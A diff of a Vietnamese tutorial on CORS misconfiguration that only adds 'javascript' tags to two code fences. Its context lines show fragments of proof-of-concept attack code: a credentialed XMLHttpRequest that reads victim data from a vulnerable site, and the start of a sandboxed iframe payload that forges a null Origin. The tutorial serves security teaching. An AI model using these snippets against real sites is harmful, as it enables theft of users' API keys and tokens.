@@ -38,7 +38,7 @@ Access-Control-Allow-Credentials: true
 Các tiêu đề này cho biết quyền truy cập được cho phép từ miền yêu cầu (`malicious-website.com`) và các yêu cầu xuyên nguồn gốc có thể bao gồm cookie (`Access-Control-Allow-Credentials: true`) và do đó sẽ được xử lý trong phiên.
 
 Vì ứng dụng phản ánh nguồn gốc tùy ý trong `Access-Control-Allow-Origin` tiêu đề, điều này có nghĩa là bất kỳ tên miền nào cũng có thể truy cập tài nguyên từ tên miền dễ bị tổn thương. Nếu phản hồi chứa bất kỳ thông tin nhạy cảm nào như khóa API hoặc mã thông báo CSRF, bạn có thể lấy được thông tin này bằng cách đặt đoạn mã sau trên trang web của mình:  
-```
+```javascript
 var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
@@ -100,7 +100,7 @@ Access-Control-Allow-Origin: null
 Access-Control-Allow-Credentials: true
 ```  
 Trong trường hợp này, kẻ tấn công có thể sử dụng nhiều thủ đoạn khác nhau để tạo ra yêu cầu xuyên nguồn gốc chứa giá trị `null` trong tiêu đề Origin. Điều này sẽ đáp ứng danh sách trắng, dẫn đến truy cập xuyên miền. Ví dụ, điều này có thể được thực hiện bằng cách sử dụng iframe yêu cầu xuyên nguồn gốc trong môi trường sandbox có dạng:  
-```
+```javascript
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
